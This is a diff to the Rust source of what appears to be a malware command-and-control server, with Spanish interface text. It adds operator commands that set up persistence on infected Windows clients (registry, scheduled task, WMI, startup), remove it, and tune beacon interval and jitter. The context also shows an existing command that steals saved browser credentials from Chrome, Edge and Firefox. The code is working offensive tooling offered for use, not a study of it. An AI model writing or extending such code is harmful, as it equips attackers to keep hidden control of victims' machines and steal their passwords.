@@ -643,6 +643,9 @@ async fn main() {
                     println!("  {} {:<20} {}", "📥".bright_cyan(), "/download <ruta>", "Descarga archivo desde el cliente".bright_white());
                     println!("  {} {:<20} {}", "📤".bright_green(), "/upload <local> <remoto>", "Sube archivo al cliente".bright_white());
                     println!("  {} {:<20} {}", "🔑".bright_red(), "/harvest", "Roba credenciales de browsers (Chrome, Edge, Firefox, etc.)".bright_white());
+                    println!("  {} {:<20} {}", "📌".bright_magenta(), "/persist <method>", "Establece persistencia (registry|task|wmi|startup)".bright_white());
+                    println!("  {} {:<20} {}", "🧹".bright_yellow(), "/persist_remove", "Remueve persistencia del cliente".bright_white());
+                    println!("  {} {:<20} {}", "📡".bright_blue(), "/beacon <int:jit>", "Configura intervalo beacon (ej: 60:30 = 60s ±30%)".bright_white());
                     println!("  {} {:<20} {}", "ℹ️ ".bright_cyan(), "/info <id>", "Muestra info detallada de un cliente".bright_white());
                     println!("  {} {:<20} {}", "🔄".bright_yellow(), "/deselect", "Deselecciona el cliente actual".bright_white());
                     println!("  {} {:<20} {}", "👋".bright_red(), "/exit, /quit", "Cierra el servidor".bright_white());
@@ -930,6 +933,111 @@ async fn main() {
                             // Enviar comando de harvest
                             if let Err(e) = client.tx.send("__HARVEST__".to_string()) {
                                 error!("[{}] Error enviando comando __HARVEST__: {}", id, e);
+                                println!("{} {}", "❌ Error:".bright_red().bold(), e);
+                            }
+                        } else {
+                            println!("{} Cliente {} desconectado", "❌".bright_red(), id);
+                            *selected_client.lock().unwrap() = None;
+                        }
+                    } else {
+                        println!("{}", "❌ No hay cliente seleccionado. Usa /select <id>".bright_red());
+                    }
+                }
+                "/persist" => {
+                    if parts.len() < 2 {
+                        println!("{} /persist <method>", "❌ Uso:".bright_red());
+                        println!("   Métodos: registry, task, wmi, startup");
+                        continue;
+                    }
+                    
+                    let method = parts[1];
+                    let selected = *selected_client.lock().unwrap();
+                    
+                    if let Some(id) = selected {
+                        let clients = clients.lock().unwrap();
+                        
+                        if let Some(client) = clients.get(&id) {
+                            info!("[{}] Comando /persist: método {}", id, method);
+                            
+                            println!();
+                            println!("{}", "╔═══════════════════════════════════════════════════════════╗".bright_magenta());
+                            println!("{}", format!("║        📌 ESTABLECIENDO PERSISTENCIA [{}]", id).bright_magenta().bold());
+                            println!("{}", "╚═══════════════════════════════════════════════════════════╝".bright_magenta());
+                            println!();
+                            println!("{}", format!("  🎯 Método: {}", method).bright_yellow());
+                            println!("{}", "  ⏳ Esperando confirmación...".bright_white().dimmed());
+                            println!();
+                            
+                            let persist_cmd = format!("__PERSIST__:{}", method);
+                            if let Err(e) = client.tx.send(persist_cmd) {
+                                error!("[{}] Error enviando comando __PERSIST__: {}", id, e);
+                                println!("{} {}", "❌ Error:".bright_red().bold(), e);
+                            }
+                        } else {
+                            println!("{} Cliente {} desconectado", "❌".bright_red(), id);
+                            *selected_client.lock().unwrap() = None;
+                        }
+                    } else {
+                        println!("{}", "❌ No hay cliente seleccionado. Usa /select <id>".bright_red());
+                    }
+                }
+                "/persist_remove" => {
+                    let selected = *selected_client.lock().unwrap();
+                    
+                    if let Some(id) = selected {
+                        let clients = clients.lock().unwrap();
+                        
+                        if let Some(client) = clients.get(&id) {
+                            info!("[{}] Comando /persist_remove: Removiendo persistencia", id);
+                            
+                            println!();
+                            println!("{}", "╔═══════════════════════════════════════════════════════════╗".bright_yellow());
+                            println!("{}", format!("║          🧹 REMOVIENDO PERSISTENCIA [{}]", id).bright_yellow().bold());
+                            println!("{}", "╚═══════════════════════════════════════════════════════════╝".bright_yellow());
+                            println!();
+                            println!("{}", "  ⏳ Limpiando...".bright_white().dimmed());
+                            println!();
+                            
+                            if let Err(e) = client.tx.send("__PERSIST_REMOVE__".to_string()) {
+                                error!("[{}] Error enviando comando __PERSIST_REMOVE__: {}", id, e);
+                                println!("{} {}", "❌ Error:".bright_red().bold(), e);
+                            }
+                        } else {
+                            println!("{} Cliente {} desconectado", "❌".bright_red(), id);
+                            *selected_client.lock().unwrap() = None;
+                        }
+                    } else {
+                        println!("{}", "❌ No hay cliente seleccionado. Usa /select <id>".bright_red());
+                    }
+                }
+                "/beacon" => {
+                    if parts.len() < 2 {
+                        println!("{} /beacon <interval:jitter>", "❌ Uso:".bright_red());
+                        println!("   Ejemplo: /beacon 60:30  (60 segundos con ±30% jitter)");
+                        continue;
+                    }
+                    
+                    let config = parts[1];
+                    let selected = *selected_client.lock().unwrap();
+                    
+                    if let Some(id) = selected {
+                        let clients = clients.lock().unwrap();
+                        
+                        if let Some(client) = clients.get(&id) {
+                            info!("[{}] Comando /beacon: configuración {}", id, config);
+                            
+                            println!();
+                            println!("{}", "╔═══════════════════════════════════════════════════════════╗".bright_blue());
+                            println!("{}", format!("║        📡 CONFIGURANDO BEACON [{}]", id).bright_blue().bold());
+                            println!("{}", "╚═══════════════════════════════════════════════════════════╝".bright_blue());
+                            println!();
+                            println!("{}", format!("  🎯 Config: {}", config).bright_yellow());
+                            println!("{}", "  ℹ️  Se aplicará en la próxima reconexión".bright_white().dimmed());
+                            println!();
+                            
+                            let beacon_cmd = format!("__BEACON__:{}", config);
+                            if let Err(e) = client.tx.send(beacon_cmd) {
+                                error!("[{}] Error enviando comando __BEACON__: {}", id, e);
                                 println!("{} {}", "❌ Error:".bright_red().bold(), e);
                             }
                         } else {
